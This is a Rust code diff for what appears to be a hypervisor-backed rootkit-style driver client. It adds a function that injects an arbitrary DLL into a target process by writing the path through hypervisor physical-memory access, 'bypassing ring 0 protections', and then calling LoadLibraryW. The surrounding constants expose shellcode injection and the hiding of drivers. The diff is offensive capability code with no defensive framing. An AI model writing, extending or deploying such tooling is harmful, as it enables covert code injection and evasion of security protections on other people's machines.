@@ -38,6 +38,7 @@ const IOCTL_DIOPROCESS_HV_REMOVE_HIDDEN_DRIVER: u32 = ctl_code(FILE_DEVICE_UNKNO
 const IOCTL_DIOPROCESS_HV_CLEAR_HIDDEN_DRIVERS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x838, METHOD_BUFFERED, FILE_ANY_ACCESS);
 const IOCTL_DIOPROCESS_HV_LIST_HIDDEN_DRIVERS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x839, METHOD_BUFFERED, FILE_ANY_ACCESS);
 const IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x840, METHOD_BUFFERED, FILE_ANY_ACCESS);
+const IOCTL_DIOPROCESS_HV_INJECT_DLL: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x841, METHOD_BUFFERED, FILE_ANY_ACCESS);
 
 const MAX_HIDDEN_DRIVERS: usize = 16;
 
@@ -686,6 +687,93 @@ pub fn hv_inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<HvInjectResult,
         Ok(HvInjectResult {
             allocated_address: response.allocated_address,
             bytes_written: response.bytes_written,
+            success: response.success != 0,
+        })
+    } else {
+        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
+    }
+}
+
+/// Response for ring -1 DLL injection
+#[derive(Debug, Clone)]
+pub struct HvInjectDllResult {
+    /// Base address of loaded DLL (0 if unknown)
+    pub module_base: u64,
+    /// Address where DLL path was written
+    pub path_address: u64,
+    /// Whether injection succeeded
+    pub success: bool,
+}
+
+/// Response struct matching C structure
+#[repr(C)]
+struct HvInjectDllResponse {
+    module_base: u64,
+    path_address: u64,
+    success: u8, // BOOLEAN
+}
+
+/// Inject a DLL into a process via ring -1 (hypervisor level)
+///
+/// This writes the DLL path via hypervisor physical memory access,
+/// bypassing ring 0 protections, then calls LoadLibraryW.
+///
+/// Requirements:
+/// - Hypervisor must be running
+/// - Target process must exist
+/// - DLL path must be accessible to the target process
+pub fn hv_inject_dll(pid: u32, dll_path: &str) -> Result<HvInjectDllResult, CallbackError> {
+    if dll_path.is_empty() {
+        return Err(CallbackError::InvalidParameter);
+    }
+
+    let handle = open_driver()?;
+
+    // Convert path to wide string with null terminator
+    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
+    let path_bytes = wide_path.len() * 2; // Each u16 is 2 bytes
+
+    // Build request with variable-length path
+    let request_size = 8 + path_bytes; // 4 (pid) + 4 (length) + path
+    let mut request_buffer = vec![0u8; request_size];
+
+    // Write PID (offset 0)
+    request_buffer[0..4].copy_from_slice(&pid.to_le_bytes());
+    // Write path length in bytes (offset 4)
+    request_buffer[4..8].copy_from_slice(&(path_bytes as u32).to_le_bytes());
+    // Write path as bytes (offset 8)
+    for (i, &wchar) in wide_path.iter().enumerate() {
+        let bytes = wchar.to_le_bytes();
+        request_buffer[8 + i * 2] = bytes[0];
+        request_buffer[8 + i * 2 + 1] = bytes[1];
+    }
+
+    let mut response = HvInjectDllResponse {
+        module_base: 0,
+        path_address: 0,
+        success: 0,
+    };
+    let mut bytes_returned: u32 = 0;
+
+    let result = unsafe {
+        DeviceIoControl(
+            handle,
+            IOCTL_DIOPROCESS_HV_INJECT_DLL,
+            Some(request_buffer.as_ptr() as *const c_void),
+            request_size as u32,
+            Some(&mut response as *mut _ as *mut c_void),
+            size_of::<HvInjectDllResponse>() as u32,
+            Some(&mut bytes_returned),
+            None,
+        )
+    };
+
+    unsafe { let _ = CloseHandle(handle); }
+
+    if result.is_ok() {
+        Ok(HvInjectDllResult {
+            module_base: response.module_base,
+            path_address: response.path_address,
             success: response.success != 0,
         })
     } else {
